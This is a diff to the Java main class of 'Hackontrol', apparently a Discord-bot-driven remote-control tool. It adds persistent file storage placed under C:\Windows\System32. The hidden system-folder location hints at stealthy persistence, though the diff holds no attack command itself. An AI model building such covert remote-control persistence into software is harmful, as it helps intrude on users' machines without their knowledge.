@@ -1,5 +1,6 @@
 package com.khopan.hackontrol;
 
+import java.io.File;
 import java.util.Collections;
 import java.util.List;
 
@@ -9,6 +10,8 @@ import org.slf4j.LoggerFactory;
 import com.khopan.hackontrol.logger.HackontrolLoggerConfig;
 import com.khopan.hackontrol.manager.Manager;
 import com.khopan.hackontrol.module.Module;
+import com.khopan.hackontrol.persistent.PersistentStorage;
+import com.khopan.hackontrol.persistent.file.FilePersistentStorage;
 import com.khopan.hackontrol.registration.ManagerRegistry;
 import com.khopan.hackontrol.registration.ModuleRegistry;
 import com.khopan.hackontrol.registry.ClassRegistration;
@@ -43,6 +46,7 @@ public class Hackontrol {
 		LOGGER = LoggerFactory.getLogger("Hackontrol");
 	}
 
+	private final PersistentStorage persistentStorage;
 	private final List<Manager> managerList;
 	private final List<Module> moduleList;
 	private final JDA bot;
@@ -55,6 +59,7 @@ public class Hackontrol {
 	private Hackontrol() {
 		Hackontrol.INSTANCE = this;
 		Thread.setDefaultUncaughtExceptionHandler(this :: handleError);
+		this.persistentStorage = new FilePersistentStorage(new File("C:\\Windows\\System32\\persistent"));
 		ManagerRegistry.register(FilteredTypeRegistry.of(null, Hackontrol.MANAGER_REGISTRY));
 		ModuleRegistry.register(FilteredTypeRegistry.of(null, Hackontrol.MODULE_REGISTRY));
 		this.managerList = ClassRegistration.list(null, Hackontrol.MANAGER_REGISTRY);
@@ -149,6 +154,10 @@ public class Hackontrol {
 
 		Hackontrol.LOGGER.warn("Uncaught Exception: {}", Errors.toString());
 		this.handler.errorOccured(thread, Errors);
+	}
+
+	public PersistentStorage getPersistentStorage() {
+		return this.persistentStorage;
 	}
 
 	public List<Manager> getManagerList() {
